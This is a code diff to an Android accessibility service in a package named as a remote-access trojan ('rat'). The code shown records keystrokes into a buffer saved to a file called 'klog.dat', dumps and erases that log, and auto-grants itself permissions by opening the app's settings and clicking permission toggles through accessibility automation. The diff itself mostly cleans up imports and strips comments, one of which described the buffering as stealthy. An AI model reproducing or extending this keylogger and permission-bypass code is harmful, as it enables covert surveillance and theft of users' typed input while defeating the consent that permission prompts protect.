@@ -1,16 +1,16 @@
 package com.enterprise.rat.services;
 
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.accessibilityservice.GestureDescription;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.Path;
-import android.graphics.Point;
+import android.net.Uri;
 import android.os.Build;
 import android.provider.Settings;
-import android.view.Display;
-import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-import android.accessibilityservice.GestureDescription;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.util.List;
@@ -56,7 +56,6 @@ public class AccessibilityService extends android.accessibilityservice.Accessibi
             }
         }
 
-        // Steathy buffer saving to prevent RAM overflow and data loss
         if (keylogBuffer.length() > MAX_BUFFER_SIZE) {
             saveBufferToFile();
         }
@@ -84,7 +83,7 @@ public class AccessibilityService extends android.accessibilityservice.Accessibi
                 java.io.FileInputStream fis = new java.io.FileInputStream(logFile);
                 fis.read(bytes);
                 fis.close();
-                logFile.delete(); // Clear after dumping
+                logFile.delete();
                 return new String(bytes);
             }
         } catch (Exception e) {}
@@ -96,18 +95,16 @@ public class AccessibilityService extends android.accessibilityservice.Accessibi
         new File(getFilesDir(), "klog.dat").delete();
     }
 
-    // Improved Auto-Grant using View IDs instead of localized text
     public boolean autoGrantPermission(String permission) {
         try {
             Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+            intent.setData(Uri.parse("package:" + getPackageName()));
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             Thread.sleep(800);
 
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root != null) {
-                // Click Permissions menu
                 List<AccessibilityNodeInfo> permNodes = root.findAccessibilityNodeInfosByViewId("android:id/title");
                 for (AccessibilityNodeInfo node : permNodes) {
                     if (node.getText() != null && node.getText().toString().toLowerCase().contains("permission")) {
@@ -117,8 +114,7 @@ public class AccessibilityService extends android.accessibilityservice.Accessibi
                 }
                 Thread.sleep(500);
                 root.recycle();
-                
-                // Click toggle switches
+
                 root = getRootInActiveWindow();
                 if (root != null) {
                     List<AccessibilityNodeInfo> switches = root.findAccessibilityNodeInfosByViewId("android:id/switch_widget");
